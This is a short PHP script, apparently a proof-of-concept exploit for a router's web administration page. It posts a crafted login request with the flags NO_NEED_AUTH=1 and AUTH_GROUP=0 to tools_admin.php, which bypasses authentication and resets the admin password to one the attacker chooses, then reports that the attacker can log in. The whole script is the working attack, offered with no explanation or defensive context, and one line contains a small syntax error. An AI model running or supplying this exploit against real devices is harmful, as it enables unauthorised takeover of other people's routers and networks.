<?php
       if(sizeof($argv)!=4) {
               echo "Usage: php5 $argv[0] <router ip addres> <port>
<admin password>\n";
               exit;
       }
       $ch=curl_init();
       curl_setopt($ch, CURLOPT_URL, "http://".$argv[1]."/tools_admin.php";);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
       curl_setopt($ch, CURLOPT_PORT, $argv[2]);
       curl_setopt($ch, CURLOPT_POST, 1);
       curl_setopt($ch, CURLOPT_POSTFIELDS,
"ACTION_POST=LOGIN&LOGIN_USER=a&LOGIN_PASSWD=b&login=+Log+In+&NO_NEED_AUTH=1&AUTH_GROUP=0&admin_name=admin&admin_password1=".urlencode($argv[3]));
       echo "+ starting request\n";
       $out = curl_exec($ch);
       if($out===false) {
               echo "- Error: could not connect (
http://$argv[1]:$argv[2]/tools_admin.php).\n";
               exit;
       } else
               echo "+ request sended\n";
       curl_close($ch);
       if(stripos($out,"Successfully")===false) {
               echo "- something goes wrong (check answer - answer.html) !\n";
               $f=fopen("answer.html","w"); fwrite($f,$out); fclose($f);
               exit;
       }
       else
               echo "+ ok, now you can login using l: admin p:$argv[3]\n";
?>

